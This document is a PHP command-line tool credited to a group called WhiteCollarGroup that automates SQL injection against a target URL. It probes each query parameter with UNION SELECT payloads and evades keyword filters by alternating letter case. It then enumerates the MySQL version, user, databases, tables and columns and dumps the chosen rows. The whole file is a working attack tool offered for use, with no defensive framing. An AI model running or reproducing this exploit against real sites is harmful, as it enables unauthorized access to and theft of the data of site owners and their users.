<?php
/*
  WhiteCollarGroup
  tinyurl.com/WCollarGroup
  
  Coded by 0KaL @0KaL_H4
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 30);
$debug = true;

$token = "wc_".uniqid();
$token_hex = hex($token);

if($argc<2) {
  show("Enter full target URL.", "?");
  $target = gets();
} else {
  $target = $argv[1];
}

// first tests
show("Checking if URL is stable...");
if(!filter_var($target, FILTER_VALIDATE_URL)) die("Invalid URL.\n");
$target_data = parse_url($target);
if(!$target_data['query']) die("No arguments/query data was found on this URL.\n");
if(!file_get_contents($target)) die("Could not connect to the specified URL.\n");

$parameters = convertUrlQuery($target_data['query']);
$payload = null;
foreach($parameters as $par=>$value) {
  show("Testing \"$par\" parameter...");
  for($i = 0; $i <= 8; $i++) {
    $numbers = array();
    for($j = 0; $j <= $i; $j++) {
      $numbers[] = $token_hex;
    }
    $numbers = implode(",", $numbers);
    $get = request(parameters($par)."&$par=-$value+UNION+ALL+SELECT+$numbers--+");
    if(preg_match("/$token/", $get)) {
      $payload = parameters($par)."&$par=-$value+";
      $payload_amount = $i;
      break 2;
    } else {
      $get = request(parameters($par)."&$par=-$value'+UNION+ALL+SELECT $numbers--+");
      if(preg_match("/$token/", $get)) {
        $payload = parameters($par)."&$par=-$value'+";
        $payload_amount = $i;
        break 2;
      } else {
        $get = request(parameters($par)."&$par=-$value\"+UNION+ALL+SELECT+$numbers--+");
        if(preg_match("/$token/", $get)) {
          $payload = parameters($par)."&$par=-$value\"+";
          $payload_amount = $i;
          break 2;
        }
      }
    }
  }
}

if($payload) {
  show("Payload found.", ".");
  show("Selected columns: ".((string)$payload_amount+1), "i");
} else {
  die("No vulnerable parameters.\n");
}

show("Getting server data...");
$version = getdata("version()");
show("MySQL version: $version", "i");
$user = getdata("user()");
show("MySQL user: $user", "i");
$currentdb = getdata("database()");
show("Current database: $currentdb", "i");
if((int)$version<5) {
  show("Sorry. This server is vulnerable, but this app can only hack 5 or newer MySQL versions.");
  exit;
}

show("Getting MySQL databases...");
$i = 0;
while(true) {
  $db = getdata("(SELECT schema_name FROM information_schema.schemata LIMIT $i,1)");
  if(!$db) break;
  show("Database: ".$db, ">");
  $i++;
}

show("Enter the name of the database you want to read.", "?");
$db2get = gets();

show("Getting tables...");
$i = 0;
while(true) {
  $db = getdata("(SELECT table_name FROM information_schema.tables WHERE table_schema=".hex($db2get)." LIMIT $i,1)");
  if(!$db) break;
  show("Table: ".$db, ">");
  $i++;
}

show("Enter the name of the table you want to read.", "?");
$tbl2get = gets();
show("Getting columns...");
$i = 0;
while(true) {
  $db = getdata("(SELECT column_name FROM information_schema.columns WHERE table_name=".hex($tbl2get)." AND table_schema=".hex($db2get)." LIMIT $i,1)");
  if(!$db) break;
  show("Column: ".$db, ">");
  $i++;
}

show("Enter the name of the columns you want to read, separated by comma (\",\").", "?");
$clm2get = gets();
$clm2get = explode(",", $clm2get);
$i = 0;
while(true) {
  show("Line $i", ">");
  foreach($clm2get as $clm) {
    $get = getdata("(SELECT $clm FROM $db2get.$tbl2get LIMIT $i,1)");
    if(!$get) break;
    show($clm."= ".$get, ">");
  }
  echo "\n";
  $i++;
}

echo "Done.\n";

// lib

function gets() {
    return trim(fgets(STDIN));
}

function hex($string){
    $hex=''; // PHP 'Dim' =]
    for ($i=0; $i < strlen($string); $i++){
        $hex .= dechex(ord($string[$i]));
    }
    return '0x'.$hex;
}

function convertUrlQuery($query) { 
    $queryParts = explode('&', $query); 
    
    $params = array(); 
    foreach ($queryParts as $param) { 
        $item = explode('=', $param); 
        $params[$item[0]] = $item[1]; 
    } 
    
    return $params; 
} 

function show($msg, $ico="*") {
  echo "[".$ico."] ".$msg."\n";
}

function request($data) {
  global $target,$target_data;
  $tg = str_replace($target_data['query'], null, $target);
  $words = array("UNION", "SELECT", "ALL", "concat", "information_schema", "tables", "columns", "schemata", "table_name", "column_name", "schema_name", "FROM", "LIMIT", "ORDER", "WHERE");
  foreach($words as $word) {
    $data = str_replace($word, upperlower($word), $data);
  }
  $url = str_replace(array(
    "?&",
    "+",
    "'",
    '"',
    " "
  ), array(
    "?",
    "%20",
    urlencode("'"),
    urlencode('"'),
    "%20"
  ), $tg.$data);
  $read = file_get_contents($url);
  if(!$read) $read = file_get_contents($url);
  return $read;
}

function getdata($data) {
  global $target,$target_data,$payload,$payload_amount,$token,$token_hex;
  $gtdata = array();
  for($i = 0; $i <= $payload_amount; $i++) {
    $gtdata[] = "unhex(hex(concat($token_hex, ($data), $token_hex)))";
  }
  $gtdata = implode(",", $gtdata);
  $get = request($payload."UNION+ALL+SELECT+$gtdata+LIMIT 0,1--+");
  $results = array();
  preg_match_all("/$token(.*)$token/", $get, $results);
  if(isset($results[1][0])) return $results[1][0];
  else return false;
}

function parameters($exception) {
  global $parameters;
  $pars = $parameters;
  unset($pars[$exception]);
  return http_build_query($pars);
}

function upperlower($str) {
  $j = strlen($str)-1;
  $newstr = null;
  for($i = 0; $i <= $j; $i++) {
    if($i % 2 == 0) {
      $newstr .= strtoupper($str[$i]);
    } else {
      $newstr .= strtolower($str[$i]);
    }
  }
  return $newstr;
}

function debug($msg) {
  global $debug;
  if($debug) show($msg, "D");
}
